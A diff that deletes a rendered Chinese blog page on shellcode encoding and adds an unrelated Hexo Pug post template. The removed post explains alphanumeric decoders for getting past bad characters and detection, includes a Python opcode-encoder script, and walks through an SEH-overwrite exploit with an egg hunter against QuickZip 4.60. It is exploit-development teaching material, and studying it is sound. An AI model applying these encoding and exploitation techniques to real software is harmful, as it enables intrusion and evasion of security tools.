@@ -1,376 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>shellcode编码技术 - Watch Security</title>
-
-<meta name="keywords" content="shellcode, exploit">
-
-<meta name="description " content="编码技术">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-10-27">2019-10-27</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">Shellcode编码技术</h2>
-            <div class="post-meta">
-                本文总共5664个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="Shellcode编码"><a href="#Shellcode编码" class="headerlink" title="Shellcode编码"></a>Shellcode编码</h3><h4 id="0x01-为何编码"><a href="#0x01-为何编码" class="headerlink" title="0x01 为何编码"></a>0x01 为何编码</h4><ul>
-<li>字符集的差异<ul>
-<li>应用程序应用平台的不同，可能的字符集会有差异，限制exploit的稳定性。</li>
-</ul>
-</li>
-<li>绕过坏字符<ul>
-<li>针对某个应用，可能对某些”坏字符“变形或者截断，破坏exploit。</li>
-</ul>
-</li>
-<li>绕过安全防护检测<ul>
-<li>有很多安全检测工具是根据漏洞相应的exploit脚本特征做的检测，所以变形exploit在一定程度上可以”免杀“。</li>
-</ul>
-</li>
-</ul>
-<h4 id="0x02-如何编码"><a href="#0x02-如何编码" class="headerlink" title="0x02 如何编码"></a>0x02 如何编码</h4><ul>
-<li>简单的加解密<ul>
-<li>用一段小巧的（以便可以在有限的字符集下实现）的代码加解密真正的shellcode。</li>
-</ul>
-</li>
-<li>alpha2/3编译器<ul>
-<li>基于特定的reg为基地址，指向shellcode起始处，就可以生成特定字符集的编码shellcode，用途很广泛。</li>
-</ul>
-</li>
-<li>custom decoder<ul>
-<li>一种用计算的方式产生可见字符形式的code，并压入栈上执行。</li>
-</ul>
-</li>
-</ul>
-<h4 id="0x03-编码实现"><a href="#0x03-编码实现" class="headerlink" title="0x03 编码实现"></a>0x03 编码实现</h4><ul>
-<li><h5 id="custom-decoder"><a href="#custom-decoder" class="headerlink" title="custom decoder"></a>custom decoder</h5><ul>
-<li><p>以4bytes的代码为一个片段（DWORD），这是在32bits下，在64bits下可以以QWORD为一个片段。通过计算产生一个片段。如opcode </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push edx = x52</span><br><span class="line">pop eax = x58</span><br><span class="line">jmp edx  = xffxe2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在内存中就是’\x52\x58\xff\xe2’，DWORD表示就是0xe2ff5852。我们如果计算得到0xe2ff5852也就可以得到相应的opcode。</p>
-</li>
-<li><p>计算原则，用到的计算数必须也是可见字符，最好只包含字母数字。</p>
-<ul>
-<li>数字范围<strong>0x30 - 0x39</strong>，字母范围<strong>0x41-0x5a, 0x61 - 0x7a</strong>。</li>
-</ul>
-</li>
-<li><p>计算方式</p>
-<ul>
-<li><p>先得到原始DWORD的相反数re_opcode。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 - 0xe2ff0000 = 0x1d010000，（有一个1溢出）</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>因此，我们用0减去re_opcode，就可以得到opcode，为什么用减法而不是加法直接得到opecode呢，以eax为例，sub eax, xx指令是‘\x2d’合法的，而add eax, xx是”\x81\xC0“。</p>
-</li>
-<li><p>那么目的就很明确了，我们需要用0减去几个和为re_opcode的数得到opcode，一般是3个比较容易以可见字符组合起来。</p>
-</li>
-<li><p>以上re_opcode为例。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1d010000 = 0x5F555555 + 0x5F555555 + 0x5e555556</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如何找到这样的组合呢？从低byte开始，除以3，不足的向前借1再除以3，使得结果在合法字符附近。注意借位细节。</p>
-</li>
-</ul>
-</li>
-<li><p>计算得到opcode</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">set eax = 0		&lt;== and eax, 0x554e4d4a	 =&gt;&quot;x25x4Ax4Dx4Ex55&quot;.</span><br><span class="line">				&lt;== and eax, 0x2a313235	 =&gt;&quot;x25x35x32x31x2A&quot;.</span><br><span class="line">sub eax, 0x5F555555			=&gt; &quot;\x2d\x55\x55\x55\x5f&quot;</span><br><span class="line">sub eax, 0x5F555555			=&gt; &quot;\x2d\x55\x55\x55\x5f&quot;</span><br><span class="line">sub eax, 0x5e555556			=&gt; &quot;\x2d\x56\x55\x55\x5e&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>现在opcode在eax中，我们需要执行的话，最好的就是入栈。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push eax ==&gt; &apos;\x50&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>自动化实现，由于每次操作太耗费时间，写了一个粗糙的脚本（暂时还没有融进Pycommand）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">  <span class="keyword">import</span> string</span><br><span class="line">  <span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#用计算的方式产生opcode，并压入栈中</span></span><br><span class="line">  <span class="comment">#input = 类似'\x90'的字节序列</span></span><br><span class="line">  <span class="comment">#output = 可见字符编码的opcode，用来生成input的code</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">global</span> rightBytes, lowst</span><br><span class="line">  rightBytes = string.printable</span><br><span class="line">  lowst = <span class="number">0x30</span></span><br><span class="line"><span class="keyword">global</span> setEaxZero, push_eax, sub_eax, longFmt, fmt</span><br><span class="line">  setEaxZero = ((<span class="number">0x25</span>, <span class="number">0x55</span>, <span class="number">0x4e</span>, <span class="number">0x4d</span>, <span class="number">0x4a</span>),</span><br><span class="line">  			 (<span class="number">0x25</span>, <span class="number">0x2a</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x35</span>))</span><br><span class="line">  push_eax = <span class="number">0x50</span></span><br><span class="line">  sub_eax = <span class="number">0x2d</span></span><br><span class="line">  fmt = <span class="string">'\\x%x'</span></span><br><span class="line">  longFmt = fmt*<span class="number">5</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">strToHex</span><span class="params">(src)</span>:</span></span><br><span class="line">  	hex_str = src.split(<span class="string">'\\x'</span>)[<span class="number">1</span>:]</span><br><span class="line">  	lenth = len(hex_str)</span><br><span class="line">  	<span class="keyword">if</span> lenth % <span class="number">4</span>:</span><br><span class="line">  		nops = [<span class="string">'90'</span>] * (<span class="number">4</span> - (lenth % <span class="number">4</span>))</span><br><span class="line">  		hex_str = nops + hex_str</span><br><span class="line">  	dword_str = []</span><br><span class="line">  </span><br><span class="line">  	i = <span class="number">0</span></span><br><span class="line">  	<span class="keyword">while</span> i &lt; len(hex_str):</span><br><span class="line">  		hex_str[i] = ord(hex_str[i].decode(<span class="string">'hex'</span>))</span><br><span class="line">  		i += <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  	i -= <span class="number">1</span></span><br><span class="line">  	<span class="keyword">while</span> i &gt;= <span class="number">3</span>:</span><br><span class="line">  		dword_str.append((hex_str[i] &lt;&lt; <span class="number">24</span>) | (hex_str[i<span class="number">-1</span>] &lt;&lt; <span class="number">16</span>) | (hex_str[i<span class="number">-2</span>] &lt;&lt; <span class="number">8</span>) | (hex_str[i<span class="number">-3</span>]))</span><br><span class="line">  		i -= <span class="number">4</span></span><br><span class="line">  	<span class="keyword">return</span> dword_str</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">GenerateOneByte</span><span class="params">(bt, flag)</span>:</span></span><br><span class="line">  	<span class="keyword">pass</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">CalcOneDword</span><span class="params">(dw)</span>:</span></span><br><span class="line">  	dw = (<span class="number">0</span> - dw) &amp; <span class="number">0xffffffff</span>				<span class="comment">#取相反数</span></span><br><span class="line">  	ans = []</span><br><span class="line">  	mod = []</span><br><span class="line">  	byte_s = [((dw &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]		<span class="comment">#取Dword的每一个byte, 从低到高</span></span><br><span class="line">  	fg = <span class="number">0</span></span><br><span class="line">  	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">  		bt = byte_s[i]</span><br><span class="line">  		<span class="keyword">if</span> fg == <span class="number">1</span>:</span><br><span class="line">  			bt -= <span class="number">1</span></span><br><span class="line">  			fg = <span class="number">0</span></span><br><span class="line">  		<span class="keyword">if</span> (bt / <span class="number">3</span>) &lt; lowst:</span><br><span class="line">  			bt += <span class="number">0x100</span></span><br><span class="line">  			fg = <span class="number">1</span></span><br><span class="line">  		ans.append(bt / <span class="number">3</span>)</span><br><span class="line">  		mod.append(bt % <span class="number">3</span>)</span><br><span class="line">  	ans_ret = ((ans[<span class="number">0</span>] &amp; <span class="number">0xff</span>) | (ans[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (ans[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (ans[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>))</span><br><span class="line">  	mod_ret = (((mod[<span class="number">0</span>] + ans[<span class="number">0</span>]) &amp; <span class="number">0xff</span>) | ((mod[<span class="number">1</span>] + ans[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) | ((mod[<span class="number">2</span>] + ans[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) | ((mod[<span class="number">3</span>] + ans[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>))</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">return</span> (ans_ret , ans_ret, mod_ret)</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">GenerateOpcodes</span><span class="params">(calc_set)</span>:</span></span><br><span class="line">  	<span class="keyword">for</span> one_set <span class="keyword">in</span> calc_set:</span><br><span class="line">  		<span class="keyword">print</span>  longFmt % setEaxZero[<span class="number">0</span>]</span><br><span class="line">  		<span class="keyword">print</span> longFmt % setEaxZero[<span class="number">1</span>]</span><br><span class="line">  		<span class="keyword">for</span> dw <span class="keyword">in</span> one_set:</span><br><span class="line">  			<span class="keyword">print</span> longFmt % (sub_eax,  dw&amp;<span class="number">0xff</span>, (dw&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>, (dw&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>, (dw&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">  		<span class="keyword">print</span> fmt % push_eax</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">GetOpcode</span><span class="params">()</span>:</span></span><br><span class="line">  	opcode = raw_input(<span class="string">'Your opcode: '</span>)</span><br><span class="line">  	<span class="keyword">return</span> opcode</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  	opcode = GetOpcode()</span><br><span class="line">  	dword_str =  strToHex(opcode)</span><br><span class="line">  	calc_set = [CalcOneDword(dw) <span class="keyword">for</span> dw <span class="keyword">in</span> dword_str]</span><br><span class="line">  	GenerateOpcodes(calc_set)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<p>用法示例，产生可以构造\x00\x00\xff\xe2机器码的costom_decoder。</p>
-<p><img src="Shellcode编码技术\6.png" alt=""></p>
-<h4 id="0x04-exploit编写实践"><a href="#0x04-exploit编写实践" class="headerlink" title="0x04 exploit编写实践"></a>0x04 exploit编写实践</h4><ul>
-<li><p>目标是QuickZip 4.60.019 <a href="https://www.exploit-db.com/exploits/11764" target="_blank" rel="noopener">CVE-OSVDB-ID 62781</a></p>
-</li>
-<li><p>漏洞分析</p>
-<ul>
-<li><p>缓冲区溢出，而且可以覆盖SEH。</p>
-<p><img src="Shellcode编码技术\1.png" alt=""></p>
-</li>
-<li><p>计算出nSEH的偏移（XP SP3中文294）。</p>
-</li>
-<li><p>正常的SEH覆盖利用，如下方式构造payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1 payload = junk + short_jmp(nSEH) + SEH + nops + shellcode</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>但是，由于payload是作为zip下的文件名存在的，有一定的字符限制。该程序对特殊字符的变形、甚至截断，尤其是SEH的值是一个noSafeSeh模块的’pop pop ret’的地址，存在非法字符。导致shellcode并不在我们预想的地方。比如放在nSEH前。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2 payload = junk + shellcode +  jmpback + nSEH + SEH + nops</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>但是我们前面提到了，nSEH前的偏移有限，所以这就限制了我们的shellcode的长度。</p>
-</li>
-<li><p>这里，显然会想到使用egg hunter技术解决，前提是我们的1处的shellcode有没有加载到内存里。这里可以用mona插件的compare功能来做到，将Shellcode单独写入一个文件，在程序崩溃后比较，就会发现在内存里存在shellcode的代码。</p>
-<p><img src="Shellcode编码技术\2.png" alt=""></p>
-<p>所以egg hunter是可行的。再次构造payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3 payload = junk + egg_hunter + nSEH + SEH	+ nops + shellcode</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>这样，我们的egg hunter是alpha3编码（基于edx寄存器的），那就有一个问题”如何满足基于的将egg hunter的地址给edx呢？毫无疑问，我们需要一段代码来调整edx。</li>
-</ul>
-</li>
-<li><p>为了更好的确定地址，我们将egg hunter放在payload的首，在nSEH处跳到调整edx的代码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4 payload = egg hunter + ajust_edx + nops + nSEH + SEH + nops + shellcode</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>那么问题来了，如何调整edx呢，我们可以在nSEH处下断点，看一下当前寄存器、栈的状态，看看有没有在egg hunter地址附近的值。如下图。</p>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>![](Shellcode编码技术\3.png)
-
-nSEH位置是0x13FBFC，偏移294得到egg_hunter地址 = 0x13fAD6。发现和ebp一定的差值，
-</code></pre><ul>
-<li><p>所以，下面的一段指令可以调整edx到egg hunter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub ebp, 0x4e3</span><br><span class="line">push ebp</span><br><span class="line">pop edx</span><br><span class="line">jmp edx</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>但是，这里的sub ebp, 0x4e3就包含坏字符。怎么办？</p>
-</li>
-<li><p>好吧Costom decoder登场了，将上面的代码使用之前提到的Costom decoder技术产生，并入栈。这时，我们只需要jmp esp就可以调整edx了，但是就又会出现一个问题”jmp esp”本身编码是坏字符。。。所以我们需要一个更好的方式，例如假如当Costom decoder完成后，我们恰好可以平滑地走到产生的code。也就是我们在执行真正的costom_decoder之前将esp调整到nSEH之前，和costom_decoder本身之前，留下足够的opcode空间。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#5 payload = egg hunter + costom_decoder + nops +  ajust_edx + nops + nSEH + SEH + nops + shellcode</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>如何调整esp？可以在栈上发现nSEH的地址，利用popad指令可以拿到ebx寄存器中，再push ebx，pop esp即可调整好esp；惊奇地发现我们能够顺利的走到ajust_edx而不需要jmp 指令。</p>
-<p>看看调整前stack上的代码状态</p>
-<p><img src="Shellcode编码技术\4.png" alt=""></p>
-<p>执行costom_decoder之后</p>
-<p><img src="Shellcode编码技术\5.png" alt=""></p>
-</li>
-<li><p>可以看到，我们生成的opcode(ajust_edx)直接送到了costom_decoder的下方，完全可以平滑地走到那里。（这里的ajust_edx根据执行完costom_decoder之后的状态改变，需要保证edx指向egg_hunter)。</p>
-</li>
-</ul>
-</li>
-<li><p>接下来就是egg_hunter搜索shellcode并执行。</p>
-</li>
-</ul>
-<h4 id="0x05-学习资源"><a href="#0x05-学习资源" class="headerlink" title="0x05 学习资源"></a>0x05 学习资源</h4><ul>
-<li><a href="https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/" target="_blank" rel="noopener">quickzip-stack-bof-0day</a></li>
-<li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">Win32 egg hunter</a></li>
-</ul>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
